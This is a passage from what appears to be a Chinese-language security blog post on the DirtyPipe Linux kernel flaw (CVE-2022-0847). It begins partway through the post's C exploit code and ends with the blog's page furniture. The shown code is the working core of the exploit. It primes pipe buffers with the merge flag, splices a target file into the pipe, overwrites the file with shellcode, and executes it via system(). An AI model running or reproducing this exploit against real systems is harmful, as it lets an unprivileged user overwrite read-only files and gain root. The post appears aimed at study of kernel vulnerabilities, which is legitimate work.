class="comment">//将pipe写满再读出,使每一个pipe_buffer带上PIPE_BUF_FLAG_CAN_MERGE标志</span></span><br><span class="line">    <span class="type">char</span> buf[PAGE_SIZE];</span><br><span class="line">    <span class="type">size_t</span> totalSize = <span class="number">16</span>*PAGE_SIZE;</span><br><span class="line">    <span class="type">size_t</span> ret_sz;</span><br><span class="line">    <span class="keyword">while</span> (totalSize)</span><br><span class="line">    {</span><br><span class="line">        ret_sz = write(pipeFd[<span class="number">1</span>],buf,PAGE_SIZE);</span><br><span class="line">        totalSize -= ret_sz;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    totalSize = <span class="number">16</span>*PAGE_SIZE;</span><br><span class="line">    <span class="keyword">while</span> (totalSize)</span><br><span class="line">    {</span><br><span class="line">        ret_sz = read(pipeFd[<span class="number">0</span>],buf,PAGE_SIZE);</span><br><span class="line">        totalSize -= ret_sz;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//触发漏洞</span></span><br><span class="line">    <span class="type">int</span> ret = splice(targetFd,<span class="literal">NULL</span>,pipeFd[<span class="number">1</span>],<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"splice"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写入目标文件</span></span><br><span class="line">    ret = write(pipeFd[<span class="number">1</span>],shellcode+<span class="number">1</span>,<span class="keyword">sizeof</span>(shellcode)<span class="number">-1</span>);</span><br><span class="line">    logd(<span class="string">"write %d"</span>,ret);</span><br><span class="line"></span><br><span class="line">    system(targetFile);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure> 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://polaris-snowfall.github.io/2024/CVE-2022-0847%20DirtyPipe/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2024/CoRCTF2022%20Cache%20of%20Castaways/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            CoRCTF2022 Cache of Castaways
          
        </div>
      </a>
    
    
      <a href="/2024/ret2hbp/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">ret2hbp 将任意地址写转为堆栈越界读写</div>
      </a>
    
  </nav>

  
   
    
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022-2025
        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2022/About">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->

<!-- ClickLove -->
 
<script src="/js/clickLove.js"></script>
 
<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>

</html>